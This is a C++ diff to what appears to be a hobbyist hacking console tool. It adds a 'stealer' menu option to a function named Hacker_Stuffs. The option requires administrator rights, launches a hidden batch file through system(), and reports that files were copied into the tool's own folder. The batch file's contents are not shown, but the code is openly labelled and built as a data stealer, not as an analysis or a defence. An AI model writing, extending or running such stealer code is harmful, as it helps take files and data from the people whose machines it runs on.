@@ -3,6 +3,7 @@
 #include <vector>
 #include <string>
 #include "all_diclarations.h"
+#include <shlobj_core.h>
 
 using namespace std;
 
@@ -56,6 +57,43 @@ void Hacker_Stuffs()
 			printf("\033[0;32m");
 			printf("(!Enter phone number with country code!)\n");
 			printf("\033[0;37m");
+			check_start_start();
+		}
+
+	}
+
+	else if (x == "stealer") // stealer (+)
+	{
+		try
+		{
+			if (IsUserAnAdmin() == true)
+			{
+				string cmd_ygt = "start ";
+				cmd_ygt += oxdan_dragon_c;
+				cmd_ygt += "\\includes\\own\\includes\\importnt_folder\\start_2.bat";
+				system(cmd_ygt.c_str());
+				cout << "\nCopying files was \033[0;32msuccessfuly\033[0;37m finished in CONSOLE-OXDAN-DRAGON-C dir.\n";
+				check_start_start();
+			}
+
+			else if (IsUserAnAdmin() == false)
+			{
+				printf("\033[0;31m");
+				printf("\n");
+				printf("(!ERROR!)");
+				printf("\033[0;37m");
+				printf(" = ");
+				printf("\033[0;32m");
+				printf("(!Run console as admin!)\n");
+				printf("\033[0;37m");
+				check_start_start();
+			}
+			
+		}
+
+		catch (...)
+		{
+			
 			check_start_start();
 		}
 
